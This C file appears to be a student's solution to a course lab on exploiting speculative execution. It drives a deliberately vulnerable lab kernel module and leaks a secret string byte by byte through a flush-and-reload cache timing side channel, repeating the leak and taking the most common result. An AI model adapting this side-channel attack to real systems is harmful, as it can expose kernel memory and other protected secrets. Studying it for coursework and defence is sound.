/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "lab2.h"
#include "lab2ipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

int* getRandom(int* array) {
	for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
		array[i] = i;
	}

	for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
		int temp = array[i];
		int r = rand() % LAB2_SHARED_MEMORY_NUM_PAGES;

		array[i] = array[r];
		array[r] = temp;
	}
	return array;
}
/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory sharedwith the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    char check[NUM_ITERATIONS][LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;
    int array[LAB2_SHARED_MEMORY_NUM_PAGES];

    int *rand = getRandom(array);
    printf("Launching attacker\n");
    for (int x = 0; x < NUM_ITERATIONS; x++) {
    	for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        	char leaked_byte;
		call_kernel_part1(kernel_fd, shared_memory, current_offset);
        
		for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++ ) {
	      		int help = rand[i];
	      		if (time_access(&shared_memory[4096*help]) < THRESHOLD) {
	       			leaked_byte = help;
	       			clflush(&shared_memory[4096*help]);
	       			break;
	       		}
	      		else { 
	      			clflush(&shared_memory[4096*help]);
	      		}
		}
 					
        	leaked_str[current_offset] = leaked_byte;
        	if (leaked_byte == '\x00') {
            		break;
        	}
    	}
    sprintf(check[x], "%s", leaked_str);
    printf("String %d is %s\n",x, check[x]);
    clflush(&check[x]);
    }
    int fincount = 0;
    for (int i = 0; i < NUM_ITERATIONS; i++) {
	    int count = 0;
	    for (int j = i+1; j < NUM_ITERATIONS; j++) {
		    if (strcmp(check[i], check[j]) == 0) {
				    count++;
		    }
	    }
	    if (count > fincount) {
		    fincount = count;
		    sprintf(leaked_str, "%s", check[i]);
	    }
    }


    printf("\n\n[Lab 2 Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
